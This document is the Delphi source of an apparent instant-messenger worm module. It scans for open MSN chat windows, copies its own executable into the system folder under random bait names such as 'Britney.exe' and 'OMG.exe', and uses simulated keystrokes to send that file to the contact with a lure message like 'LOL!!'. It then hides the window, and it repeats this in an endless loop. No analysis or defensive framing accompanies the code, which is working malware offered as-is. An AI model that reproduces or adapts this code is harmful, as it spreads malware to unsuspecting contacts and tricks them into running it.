unit pIMS;

interface

Uses
  Windows;


Var
  Buf   :Array[0..40000] Of Char;
  Buff  :Array[0..40000] Of Char;

  Wins: Array[0..300] Of Record
    Name: String;
    Wnd : Hwnd;
  End;
  WCNT : Integer = 0;

  Procedure Infect(Title: String);
  Procedure msn;

implementation

function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
asm
        PUSH    EDI
        PUSH    ESI
        PUSH    EBX
        MOV     ESI,EAX
        MOV     EDI,EDX
        MOV     EBX,ECX
        XOR     AL,AL
        TEST    ECX,ECX
        JZ      @@1
        REPNE   SCASB
        JNE     @@1
        INC     ECX
@@1:    SUB     EBX,ECX
        MOV     EDI,ESI
        MOV     ESI,EDX
        MOV     EDX,EDI
        MOV     ECX,EBX
        SHR     ECX,2
        REP     MOVSD
        MOV     ECX,EBX
        AND     ECX,3
        REP     MOVSB
        STOSB
        MOV     EAX,EDX
        POP     EBX
        POP     ESI
        POP     EDI
end;

function StrPCopy(Dest: PChar; const Source: string): PChar;
begin
  Result := StrLCopy(Dest, PChar(Source), Length(Source));
end;

function GetHandleFromWindowTitle(TitleText: String): hWnd;
var
  StrBuf: Array[0..$FF] of Char;
begin
  Result := FindWindow(PChar(0), StrPCopy(StrBuf, TitleText));
end;

procedure SendKey(const text: String);
var
   i: Integer;
   shift: Boolean;
   vk,scancode: Word;
   ch: Char;
   c,s: Byte;
const
   vk_keys: Array[0..9] of Byte =
      (VK_HOME,VK_END,VK_UP,VK_DOWN,VK_LEFT,
        VK_RIGHT,VK_PRIOR,VK_NEXT,VK_INSERT,
        VK_DELETE);
   vk_shft: Array[0..2] of Byte =
     (VK_SHIFT,VK_CONTROL,VK_MENU);
   flags: Array[false..true] of Integer =
     (KEYEVENTF_KEYUP, 0);
begin
   shift := false;
   for i := 1 to Length(text) do
   begin
      ch := text[i];
      if ch >= #250 then
      begin
         s := Ord(ch) - 250;
         shift := not Odd(s);
         c := vk_shft[s shr 1];
         scancode := MapVirtualKey(c,0);
         Keybd_Event(c,scancode,flags[shift],0);
      end
      else
      begin
         vk := 0;
         if ch >= #240 then
            c := vk_keys[Ord(ch) - 240]
         else if ch >= #228 then
            c := Ord(ch) - 116
         else if ch < #32 then
            c := Ord(ch)
         else
         begin
            vk :=VkKeyScan(ch);
            c :=LoByte(vk);
         end;
         scancode := MapVirtualKey(c,0);
         if not shift and (Hi(vk) > 0) then
            Keybd_Event(VK_SHIFT,$2A,0,0);
         Keybd_Event(c,scancode,0,0);
         Keybd_Event(c,scancode,KEYEVENTF_KEYUP,0);
         if not shift and (Hi(vk) > 0) then
            Keybd_Event(VK_SHIFT,
               $2A,KEYEVENTF_KEYUP,0);
      end;
   end;
end;

procedure MakeWindowActive(wHandle: hWnd);
begin
  if IsIconic(wHandle) then
   ShowWindow(wHandle, SW_RESTORE)
  else
   setforegroundwindow(wHandle);
end;

Function EnumWinProc(W: Hwnd; Lpr: LParam): Bool; Stdcall;
Begin
  If IsWindowVisible(W) Then
  Begin
    GetWindowText(W, Buf, 10000);
    If Buf[0] <> #0 Then
    Begin
      Wins[WCNT].Name := Buf;
      Wins[WCNT].Wnd := W;
      inc(WCNT);
    End;
  End;
  Result := True;
End;

function LowerCase(const S: string): string;
var
  Ch: Char;
  L: Integer;
  Source, Dest: PChar;
begin
  L := Length(S);
  SetLength(Result, L);
  Source := Pointer(S);
  Dest := Pointer(Result);
  while L <> 0 do
  begin
    Ch := Source^;
    if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
    Dest^ := Ch;
    Inc(Source);
    Inc(Dest);
    Dec(L);
  end;
end;

Procedure GetWindows;
Var
  I: Integer;
Begin
  WCNT := 0;
  EnumWindows(@EnumWinProc, 0);
  For I := 0 To WCNT -1 Do
  Begin
    If Pos(' - konversation', lowercase(Wins[I].Name)) > 0 Then Infect(Wins[I].Name);
    Wins[I].Name := '';
    Wins[I].Wnd := 0;
    Sleep(1024);
  End;
End;

Procedure Infect(Title: String);
const
  SK_SHIFT_DN = #250;
  SK_SHIFT_UP = #251;
  SK_CTRL_DN = #252;
  SK_CTRL_UP = #253;
  SK_ALT_DN = #254;
  SK_ALT_UP = #255;
Var
  I: Integer;
  D: HWND;
  Path: String;
  A : Array[0..255] Of Char;
  c : string;
Begin

  Path := SysDir('');

  Randomize;
  Case Random(10) Of
    0:Insert('Britney.exe', Path, Length(Path)+1);
    1:Insert('Funny.exe', Path, Length(Path)+1);
    2:Insert('Haha.exe', Path, Length(Path)+1);
    3:Insert('Latest_Tests.exe', Path, Length(Path)+1);
    4:Insert('Install.exe', Path, Length(Path)+1);
    5:Insert('Setup.exe', Path, Length(Path)+1);
    6:Insert('Addon.exe', Path, Length(Path)+1);
    7:Insert('test.exe', Path, Length(Path)+1);
    8:Insert('heh.exe', Path, Length(Path)+1);
    9:Insert('OMG.exe', Path, Length(Path)+1);
  End;
  CopyFile(pChar(ParamStr(0)), pChar(Path), False);

  D := GetHandleFromWindowTitle(Title);
  MakeWindowActive(D);
  SetWindowText(D, pChar('--mam--'));

  C := SK_CTRL_DN+SK_ALT_DN+'?'+SK_ALT_UP+SK_CTRL_UP;
  For I := 1 To Length(Path) Do
    If Path[i] = '\' Then
    Begin
      Delete(Path, I, 1);
      Insert(C, Path, I);
    End;


  // alt + s
  SendKey(SK_ALT_DN+'F'+SK_ALT_UP);
  Sleep(300);
  SendKey(Path);
  SendKey(#13);
  Sleep(300);

  Case Random(8) Of
    0:Path := ':) heh';
    1:Path := '\o/ lmfao';
    2:Path := 'WoW....';
    3:Path := ';p hah';
    4:Path := 'WTF ;D';
    5:Path := 'hahaha';
    6:Path := 'LOL!!';
    7:Path := 'Rofl :D';
  End;
  SendKey(Path);
  SendKey(#13);
  ShowWindow(D, 0);
end;

Procedure msn;
Var
  Tmp   :String;
  Win   :String;
Label
  D;
Begin
D:
  GetWindows;
Goto D;
End;

end.
